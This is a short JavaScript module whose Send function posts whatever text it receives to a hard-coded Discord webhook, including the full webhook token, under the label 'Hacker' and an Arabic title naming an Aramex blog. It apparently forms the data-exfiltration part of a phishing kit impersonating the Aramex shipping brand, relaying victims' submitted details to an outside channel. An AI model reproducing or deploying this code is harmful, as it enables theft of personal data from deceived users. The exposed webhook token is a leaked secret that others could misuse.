import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1330902052670275655/qS-XsHGyJD1PR82BZuWKkPXgToGFRWAIKYzfRAEjzoNUSPZGnCrPXwk2SQGxi-5h5W6Y",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
